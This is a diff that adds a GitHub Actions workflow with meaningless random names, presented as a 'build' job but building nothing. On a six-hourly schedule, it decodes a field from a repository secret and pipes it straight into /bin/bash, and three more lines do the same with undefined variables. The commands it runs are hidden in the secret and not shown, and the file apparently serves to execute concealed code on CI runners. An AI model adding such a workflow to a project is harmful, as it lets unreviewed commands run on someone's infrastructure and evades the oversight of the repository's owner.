@@ -1,0 +1,20 @@
+name: hainnquandaof
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hainnquandaof
+        env:
+          j1: ${{ secrets.j1 }}
+        run: |
+          echo $j1 | jq -r .mbjme5 | /bin/bash
+          echo $injv1 | jq -r .t89503 | /bin/bash
+          echo $pq79513 | jq -r .jy11 | /bin/bash
+          echo $khzqw2245 | jq -r .hh28 | /bin/bash
+
